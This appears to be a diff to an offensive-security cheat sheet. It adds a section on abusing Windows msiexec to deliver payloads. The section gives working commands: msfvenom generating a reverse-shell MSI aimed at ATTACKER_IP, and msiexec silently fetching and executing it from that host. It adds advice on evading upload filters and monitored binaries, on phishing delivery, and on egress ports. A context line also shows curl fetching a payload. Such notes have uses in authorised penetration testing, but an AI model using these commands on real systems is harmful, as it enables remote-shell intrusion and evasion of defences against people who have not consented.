@@ -181,3 +181,27 @@ curl http://<host>:8080/sh/p.txt
 PrintSpoofer conditions for this pattern: Spooler running, SeImpersonatePrivilege held, no EDR reaping the binary.
 
 <!-- promoted-slug: webshell-windows-tool-staging -->
+
+## Msiexec (MSI payload delivery)
+
+`msiexec` is a signed Microsoft binary that installs `.msi` packages, and it fetches them over
+HTTP/SMB itself, so it doubles as a download-and-execute LOLBIN that survives extension filters
+blocking `.exe`:
+
+```powershell
+# Generate the package (stageless shell needs only a plain nc listener)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi -o shell.msi
+
+# On target, fetch and execute over HTTP in one step (no on-disk staging):
+msiexec /q /i http://ATTACKER_IP:80/shell.msi
+
+# Or execute an already-dropped package:
+msiexec /q /i shell.msi
+```
+
+When to reach for it: upload filters that allow "installer-looking" file types, hosts where
+the usual LOLBINs (mshta/rundll32/regsvr32) are blocked or heavily monitored, and phishing
+deliveries where an installer extension raises less suspicion. The `/q` flag keeps it silent;
+pair with an egress-safe port (443/80).
+
+<!-- promoted-slug: windows-msiexec-payload-delivery -->
